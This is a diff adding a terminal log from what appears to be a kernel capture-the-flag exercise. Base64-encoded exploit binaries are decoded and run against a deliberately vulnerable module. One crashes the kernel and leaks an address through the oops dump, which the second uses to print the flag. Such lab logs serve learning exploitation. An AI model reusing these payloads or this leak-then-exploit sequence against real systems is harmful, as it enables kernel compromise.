@@ -1,0 +1,88 @@
+[    3.978170] 9pnet_virtio: no channels available for device hostshare
+mount: mounting hostshare on /home/ctf failed: No such file or directory
+[    4.022156] Module successfuly initialized
+-sh: can't access tty; job control turned off
+~ $ base64 -d | gunzip > attack4_reveal
+H4sIAEQFlGEA/+2av29TMRDH3bykFAaSSpVa0YG0EOgAqZAYGCroAkSCvwHj5jklappEzmtLJigS
+UlFB4i9AXdkYGKogpdmgSIwwMSDB0JEKBhaU+uxz67w2TExwHyk53/d8fs7LD8mXe3D99o3EwABz
+JNhVZrzMrPHts+bs/hStXWGBfj7GBs3c5EHIy7B2Bz1nWcYayEt5vrues+O4JWf9vEEYZFHPYh7a
+UZSnEr15BEEQBEEQBEEQBPE/swnn5MKWOz63wU2nCo876bWPEHmSzI3p2CYcowvrM8Zpw9m7taJJ
+py51nFpoZ3GR1qw+petF1pO5DQjoNb5MaLs+knsF/rNH2yfs0t9BfpvM/dIW0KH3GGKTZmbzxbcu
+uEPWdYkZcHXimLaY+LJjQ1ktbUKZ4GBjd3H51jvz6kx0y0xpD7s9Q1FBh2ZcKG2qEwRBEARBEARB
+EATxTzBdV7XidH2lykO5XC5KJpWqKX3K/gMB/Avv/q/v0XX1wP0f36MHDA7iPrZvYLcbnztinne7
+ndWdVlfj9Iuo3/wavPH1a6hDycHnFuoPY+vfQf15TFeoQ4HBZxV1KEv4PEUdqg4+G32u+7rPdbdR
+h8qEzye8Sz9j9/kzdmnE77Ptr0gwV89w/EB9NKYnzP06/L6kUHe1HMdJ1F0pxXEaPgpHfB5OGT04
+dN1zRj+8n9+mVSNgU1jQ2UdEkSguXOZKLktRyYvGIqsrWRdK8gWpqrLCi0qGXIShYg0lRahnRkuq
+ahUjiMXaUjWy46KoCtXktVKpIVHS82Gu0+ZFOC8jXq/VuQrLztWT3HBFlSPJo5oJW6d3VavFlrUi
+bsV8yZj9xvFSuYJfOx7J+xg0Qy6rISuFdptzSyVWF81KDceczzUavBEJFTEuQxEJxvKN5mIk5rSN
+lLX33MgsnTfT8jrxb/1+jPs9OT19PLH+nT7tOBOYHzhhv5/HGtfP4+jtNWLsvH4Mefnu8zyK+RnX
+B9QnH64dm4LrWLuGQagGwl7gWiaO9ri/d/93YBJ/t2KvP+ay4T75H85Ye+GI/frsAQ5m9CbAJQAA
+~ $ base64 -d | gunzip > attack4_flag
+H4sIAEQFlGEA/+1av2sUTxSfZC+JinDJlxRfTIpcyKFIuHgSJEKQIFG3SJHGepzc7sXD3A92J+bS
+6JeIYAwBu2/hv2BpESNcQhCMVhYWVjZaxDIoIlhc5s28d9nd5LDRyvnA7Zv3mffevJvbPZi37/61
+meudHR2M0MmuMK31TmndXBm7NdIyUdwEc9S1h3Vr29ThVMTDyD3USLJeI8CvK6LTeiQfY0oko37d
+MBhCfgj9UGaQnv0n7mdhYWFhYWFhYWFhYWFh8Tdjo1Nd3C06PjdATXe5D7fTj6bVWdtdTWVH1NwG
+HKPdtUmtNODsvbmkkO7KbxPrNsYxyOaU8oSpfNNtjBJ5wkReS2Wfg7UK/C2j5Fp/9hXo6ytvTpn1
+UsNAp7Lg6aZ3gToN1PrKW7ToN+rlp5+boA4alfxH4up4XJ1W6gZUEQ7zlioPneIHnSJuSR8mnv+u
+96M+4a6+Vt+2MaMCaGsoLaip1R0dbkvHbM2qMJPg3FSDyPQA7QbUMNBGT6V1McTCwsLCwsLCwsLC
+wsLC4s9grBZUC2O1pQr3/Lulgs/GigtiPifrkvlBUA3UqfmXcOCtPL2/j/HqJE3v52O8w+DkHYXp
+I9hvJm3Na/z95n/39jabCsSbdoT95o1Pzssofwl5KEFEcZXiJOLfRP5Jgi8hD2WDKOrIQykiigdt
+4v/fJv4z5KHkEMUL5JN9Czu4S4W++L7tYtdGcp/fI09VDMJH5KkQQfiCfCbB/8BfLPl7/USeyjuE
+Hr3vDqNaUKvtA3mqtRAGkae6CeE83FLH3FdZzTtH8sxr/mj+X3ULiMNmLybuQyGlKNwZ5/p2F2GZ
+FarlcknyQuB7IReeF7Aw8IXHA18uBhXDaEKUq4sVacYFURHBMq8Wi6GPlLIHW+LmhTfvS16r1njg
+lUhVRmwpKEk/EcFwiRCGxGUhX14WdfN4MvPU8mJpwTdTeqTnuPTpKdZD7lc8VvQYhPbDkM8tFk3G
+MKiJ5YUqjnUcGHA+p+xCKQLJuO8JKRjLhctlKeaUlIGRt2mk18tps5xy/C3/TwPRnp9Yn1CiP6hN
+uw/0A4GJQ0SrX+hwPop4LxNjZ9UHKpfkT89BBv1Hqc+ojT+sDfXEJM6h/zuchPLfGVwL8C/Kk9Hc
+o8/lsJETie+fUFlfG/8L2M81eky+URwAueK7QCAmAAA=
+~ $ chmod +x attack4_reveal attack4_flag
+~ $ ./attack4_reveal
+[   44.651216] Device opened
+[   44.656472] IOCTL Called
+[   44.659988] 320 bytes read from device
+[   44.664933] 200 bytes written to device
+[   44.670432] BUG: kernel NULL pointer dereference, address: 0000000000000000
+[   44.676408] #PF: supervisor write access in kernel mode
+[   44.676882] #PF: error_code(0x0002) - not-present page
+[   44.677238] PGD 8000000001e26067 P4D 8000000001e26067 PUD 1e25067 PMD 0
+[   44.677866] Oops: 0002 [#1] SMP PTI
+[   44.678289] CPU: 0 PID: 102 Comm: attack4_reveal Tainted: G           O     1
+[   44.678566] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.134
+[   44.679496] RIP: 0010:get_kcore_size+0x0/0xc0
+[   44.679864] Code: 04 0f 88 31 96 85 00 75 dc 89 44 24 04 48 89 ef e8 55 82 54
+[   44.680477] RSP: 0018:ffffb206c01afee8 EFLAGS: 00000202
+[   44.680685] RAX: ffff9021435a80c0 RBX: 0000000000000000 RCX: 0000000000000000
+[   44.680933] RDX: ffff902141e770a0 RSI: 0000000000000000 RDI: 0000000000000000
+[   44.681482] RBP: ffff9021401a29c0 R08: ffff90214382ad20 R09: 0000000000000000
+[   44.681725] R10: ffff902141e770a0 R11: 656369766564206f R12: fffffffffffffffb
+[   44.681962] R13: ffffb206c01aff08 R14: 0000000000402160 R15: 0000000000000000
+[   44.682273] FS:  0000000000000000(0000) GS:ffff902143800000(0000) knlGS:00000
+[   44.682551] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   44.682747] CR2: 0000000000000000 CR3: 0000000001e12000 CR4: 00000000003006f0
+[   44.683076] Call Trace:
+[   44.684012]  ? ksys_write+0x5a/0xd0
+[   44.684166]  ? do_syscall_64+0x43/0x110
+[   44.684310]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[   44.684561] Modules linked in: vuln(O)
+[   44.685025] CR2: 0000000000000000
+[   44.685434] ---[ end trace 9ab2621c00bdb855 ]---
+[   44.685643] RIP: 0010:get_kcore_size+0x0/0xc0
+[   44.685803] Code: 04 0f 88 31 96 85 00 75 dc 89 44 24 04 48 89 ef e8 55 82 54
+[   44.686381] RSP: 0018:ffffb206c01afee8 EFLAGS: 00000202
+[   44.686551] RAX: ffff9021435a80c0 RBX: 0000000000000000 RCX: 0000000000000000
+[   44.686772] RDX: ffff902141e770a0 RSI: 0000000000000000 RDI: 0000000000000000
+[   44.686992] RBP: ffff9021401a29c0 R08: ffff90214382ad20 R09: 0000000000000000
+[   44.687212] R10: ffff902141e770a0 R11: 656369766564206f R12: fffffffffffffffb
+[   44.695014] R13: ffffb206c01aff08 R14: 0000000000402160 R15: 0000000000000000
+[   44.696533] FS:  0000000000000000(0000) GS:ffff902143800000(0000) knlGS:00000
+[   44.696788] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   44.697138] CR2: 0000000000000000 CR3: 0000000001e12000 CR4: 00000000003006f0
+[   44.700719] All device's closed
+Killed
+~ $ echo ffff9021435a80c0 | xxd -p -r | ./attack4_flag
+[   57.493446] Device opened
+[   57.501738] IOCTL Called
+[   57.507195] 320 bytes read from device
+[   57.512387] 216 bytes written to device
+flag{c0ngr4t5_on_ur_f1r5t_k3rn3l}
+[   57.522975] All device's closed
+~ $
